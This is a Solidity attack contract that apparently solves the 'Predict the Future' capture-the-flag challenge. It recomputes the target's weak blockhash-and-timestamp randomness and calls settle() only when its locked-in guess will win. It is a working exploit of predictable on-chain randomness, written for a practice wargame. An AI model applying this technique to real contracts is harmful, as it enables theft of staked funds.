pragma solidity ^0.7.3;

interface IPredictTheFutureChallenge {
    function isComplete() external view returns (bool);

    function lockInGuess(uint8 n) external payable;

    function settle() external;
}

contract PredictTheFutureChallengeAttack {
    IPredictTheFutureChallenge public challenge;
    uint8 guess = 1;
    uint256 settlementBlockNumber;

    constructor(address challengeAddress) {
        challenge = IPredictTheFutureChallenge(challengeAddress);
    }

    function lockInGuessAttack() external payable {
        require(address(this).balance >= 1 ether, "not enough funds");
        challenge.lockInGuess{value: 1 ether}(guess);

        settlementBlockNumber = block.number + 1;

        // return all of it to EOA
        tx.origin.transfer(address(this).balance);
    }

    function settleAttack() external {
        uint8 answer = uint8(
            uint256(
                keccak256(
                    abi.encodePacked(
                        blockhash(block.number - 1),
                        block.timestamp
                    )
                )
            )
        ) % 10;

        if ((answer == guess) && (block.number > settlementBlockNumber)) {
            challenge.settle();
        }
    }

    receive() external payable {}
}
